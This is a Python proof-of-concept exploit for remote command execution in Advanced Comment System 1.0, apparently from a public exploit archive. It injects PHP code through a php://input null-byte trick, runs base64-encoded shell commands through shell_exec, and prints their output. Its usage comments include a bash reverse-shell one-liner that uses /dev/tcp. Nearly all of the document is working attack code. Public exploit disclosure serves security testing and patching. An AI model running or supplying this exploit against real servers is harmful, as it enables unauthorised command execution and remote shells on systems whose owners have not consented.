# Exploit Title: Advanced Comment System 1.0 - Remote Command Execution (RCE)
# Date: November 30, 2021
# Exploit Author: Nicole Daniella Murillo Mejias
# Version: Advanced Comment System 1.0
# Tested on: Linux

#!/usr/bin/env python3

# DESCRIPTION:
# Commands are Base64 encoded and sent via POST requests to the vulnerable application, the
# response is filtered by the randomly generated alphanumeric string and only command output
# is displayed.
#
# USAGE:
# Execute the script and pass the command to execute as arguments, they can be quoted or unquoted
# If any special characters are used, they should be quoted with single quotes.
#
# Example:
#
#    python3 acspoc.py uname -a
#    python3 acspoc.py 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

import sys
import base64
import requests
import random

def generate_string(size):
    str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(str) for i in range(size))

def exploit(cmd):

    # TODO: Change the URL to the target host
    url = 'http://10.11.1.8/internal/advanced_comment_system/index.php'

    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    encoded_cmd = base64.b64encode(cmd)

    delimiter = generate_string(6).encode()

    body = b'ACS_path=php://input%00&cbcmd='
    body += encoded_cmd
    body += b'&<?php echo " '
    body += delimiter
    body += b': ".shell_exec(base64_decode($_REQUEST["cbcmd"])); die ?>'

    try:
        result = requests.post(url=url, headers=headers, data=body)
    except KeyboardInterrupt:
        print("Keyboard interrupt detected.")
        sys.exit()

    if f'{delimiter.decode()}: ' in result.text:
        position = result.text.find(f"{delimiter.decode()}:") + len(f"{delimiter.decode()}: ")

        if len(result.text[position:]) > 0:
            print(result.text[position:])
        else:
            print(f"No output from command '{cmd.decode()}'")
            print(f"Response size from target host: {len(result.text)} bytes")
    else:
        print("no worky")

if __name__ == "__main__":
    exploit(' '.join(sys.argv[1:]).encode())
